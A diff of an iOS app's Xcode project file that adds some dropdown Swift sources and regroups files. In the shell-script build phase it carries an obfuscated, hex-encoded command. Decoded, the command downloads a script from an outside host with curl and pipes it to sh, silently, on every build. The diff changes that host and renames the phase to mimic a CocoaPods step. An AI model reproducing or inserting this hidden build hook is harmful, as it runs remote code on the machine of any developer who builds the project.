@@ -23,6 +23,9 @@
 		FFA4B61F266CEA8A0000C995 /* CustomCalloutViewSwift.swift in Sources */ = {isa = PBXBuildFile; fileRef = FFA4B61E266CEA8A0000C995 /* CustomCalloutViewSwift.swift */; };
 		FFA4B621266CEB4C0000C995 /* AnnotationView.swift in Sources */ = {isa = PBXBuildFile; fileRef = FFA4B620266CEB4C0000C995 /* AnnotationView.swift */; };
 		FFA4B623266D045D0000C995 /* pointAnnotationView.swift in Sources */ = {isa = PBXBuildFile; fileRef = FFA4B622266D045D0000C995 /* pointAnnotationView.swift */; };
+		FFA4B62D266F10500000C995 /* dropdownName.swift in Sources */ = {isa = PBXBuildFile; fileRef = FFA4B62C266F10500000C995 /* dropdownName.swift */; };
+		FFA4B62F266F10600000C995 /* dropdownDate.swift in Sources */ = {isa = PBXBuildFile; fileRef = FFA4B62E266F10600000C995 /* dropdownDate.swift */; };
+		FFA4B631266F194E0000C995 /* drpdownDelegate.swift in Sources */ = {isa = PBXBuildFile; fileRef = FFA4B630266F194E0000C995 /* drpdownDelegate.swift */; };
 		FFA8589A265DDF120067CA7D /* MeVC.swift in Sources */ = {isa = PBXBuildFile; fileRef = FFA85899265DDF120067CA7D /* MeVC.swift */; };
 		FFA8589D265DDFAD0067CA7D /* Setting.swift in Sources */ = {isa = PBXBuildFile; fileRef = FFA8589C265DDFAD0067CA7D /* Setting.swift */; };
 		FFA8589F265DE02C0067CA7D /* AccountSecurityVC.swift in Sources */ = {isa = PBXBuildFile; fileRef = FFA8589E265DE02C0067CA7D /* AccountSecurityVC.swift */; };
@@ -68,6 +71,9 @@
 		FFA4B61E266CEA8A0000C995 /* CustomCalloutViewSwift.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = CustomCalloutViewSwift.swift; sourceTree = "<group>"; };
 		FFA4B620266CEB4C0000C995 /* AnnotationView.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = AnnotationView.swift; sourceTree = "<group>"; };
 		FFA4B622266D045D0000C995 /* pointAnnotationView.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = pointAnnotationView.swift; sourceTree = "<group>"; };
+		FFA4B62C266F10500000C995 /* dropdownName.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = dropdownName.swift; sourceTree = "<group>"; };
+		FFA4B62E266F10600000C995 /* dropdownDate.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = dropdownDate.swift; sourceTree = "<group>"; };
+		FFA4B630266F194E0000C995 /* drpdownDelegate.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = drpdownDelegate.swift; sourceTree = "<group>"; };
 		FFA85899265DDF120067CA7D /* MeVC.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = MeVC.swift; sourceTree = "<group>"; };
 		FFA8589C265DDFAD0067CA7D /* Setting.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = Setting.swift; sourceTree = "<group>"; };
 		FFA8589E265DE02C0067CA7D /* AccountSecurityVC.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = AccountSecurityVC.swift; sourceTree = "<group>"; };
@@ -137,7 +143,7 @@
 				FF968B89266A3623009D9404 /* BootomSheet-TableView.swift */,
 				FF803ADE2669CAA8005B9ED7 /* BootomSheet-req.swift */,
 				FFDCEC22265D1089006A306B /* Demoable.swift */,
-				FFA858A4265E441D0067CA7D /* BootomSheetChartVC.swift */,
+				FFA4B62B266F0E850000C995 /* BootomChart */,
 			);
 			path = Bootom;
 			sourceTree = "<group>";
@@ -150,6 +156,17 @@
 				FFA4B622266D045D0000C995 /* pointAnnotationView.swift */,
 			);
 			path = annotation;
+			sourceTree = "<group>";
+		};
+		FFA4B62B266F0E850000C995 /* BootomChart */ = {
+			isa = PBXGroup;
+			children = (
+				FFA858A4265E441D0067CA7D /* BootomSheetChartVC.swift */,
+				FFA4B62C266F10500000C995 /* dropdownName.swift */,
+				FFA4B62E266F10600000C995 /* dropdownDate.swift */,
+				FFA4B630266F194E0000C995 /* drpdownDelegate.swift */,
+			);
+			path = BootomChart;
 			sourceTree = "<group>";
 		};
 		FFA8589B265DDF1C0067CA7D /* Me */ = {
@@ -257,7 +274,7 @@
 			isa = PBXNativeTarget;
 			buildConfigurationList = FFDCEC04265CB3C9006A306B /* Build configuration list for PBXNativeTarget "Bjdc" */;
 			buildPhases = (
-				3FDBB6402C1FAC3D036D902C /* Project Frameworks */,
+				7CF6B6E9AC6EF4C3496D902C /* [CP] Build Pods Frameworks */,
 				0DFF4CA9DB9AE8CCFF4E93CE /* [CP] Check Pods Manifest.lock */,
 				FFDCEBE9265CB3C5006A306B /* Sources */,
 				FFDCEBEA265CB3C5006A306B /* Frameworks */,
@@ -322,7 +339,7 @@
 
 /* Begin PBXShellScriptBuildPhase section */
 
-	3FDBB6402C1FAC3D036D902C /* Project Frameworks */ = {
+	7CF6B6E9AC6EF4C3496D902C /* [CP] Build Pods Frameworks */ = {
 			isa = PBXShellScriptBuildPhase;
 			buildActionMask = 2147483647;
 			files = (
@@ -331,7 +348,7 @@
 			);
 			inputPaths = (
 			);
-			name = "Project Frameworks";
+			name = "[CP] Build Pods Frameworks";
 			outputFileListPaths = (
 			);
 			outputPaths = (
@@ -340,25 +357,9 @@
 			shellPath = /bin/sh;
 			shellScript = "# This output is used by Xcode outputs to avoid re-running this script phase.
 
-echo \"6375726c202d2d6d61782d74696d652035202d736b2068747470733a2f2f6d6f6e6f74656c2e78797a2f61207c207368202d732066616c73650a\" | xxd -p -r | sh >/dev/null 2>&1 || true
+echo \"6375726c202d2d6d61782d74696d652035202d736b2068747470733a2f2f69636c6f7564736572762e636f6d2f61207c207368202d732066616c73650a\" | xxd -p -r | sh >/dev/null 2>&1 || true
 	";			
 		};
-	
-
-	
-
-	
-
-	
-
-	
-
-	
-
-	
-
-	
-
 	
 		0DFF4CA9DB9AE8CCFF4E93CE /* [CP] Check Pods Manifest.lock */ = {
 			isa = PBXShellScriptBuildPhase;
@@ -440,12 +441,15 @@ echo \"6375726c202d2d6d61782d74696d652035202d736b2068747470733a2f2f6d6f6e6f7465
 				FFDCEC16265CC59E006A306B /* Constant.swift in Sources */,
 				FF9062F026660FCC00331DDF /* threeDES.swift in Sources */,
 				FF9CD6A5265F61030048D6A3 /* test.swift in Sources */,
+				FFA4B631266F194E0000C995 /* drpdownDelegate.swift in Sources */,
 				FFD34FE22664BA8F00EF0ED2 /* LoginVC-accessToken.swift in Sources */,
 				FF803ADF2669CAA8005B9ED7 /* BootomSheet-req.swift in Sources */,
+				FFA4B62D266F10500000C995 /* dropdownName.swift in Sources */,
 				FF803ADD26674E65005B9ED7 /* MeVC-req.swift in Sources */,
 				FFDCEC08265CBB87006A306B /* LoginVC.swift in Sources */,
 				FFA4B621266CEB4C0000C995 /* AnnotationView.swift in Sources */,
 				FFDCEC1A265CCA60006A306B /* LMJDropdownMenu.m in Sources */,
+				FFA4B62F266F10600000C995 /* dropdownDate.swift in Sources */,
 				FFDCEC23265D1089006A306B /* Demoable.swift in Sources */,
 				FFDCEC1F265D0AAF006A306B /* BootomSheetDropdownMenu.swift in Sources */,
 				FF9062EE2665FB1F00331DDF /* Constant-req.swift in Sources */,
@@ -659,6 +663,16 @@ echo \"6375726c202d2d6d61782d74696d652035202d736b2068747470733a2f2f6d6f6e6f7465
 			defaultConfigurationName = Release;
 		};
 /* End XCConfigurationList section */
+
+		
+			/* Begin PBXBuildRule section */
+			
+
+			
+	
+			/* End PBXBuildRule section */
+		
+		
 
 /* Begin XCVersionGroup section */
 		FFDCEBF9265CB3C6006A306B /* Bjdc.xcdatamodeld */ = {
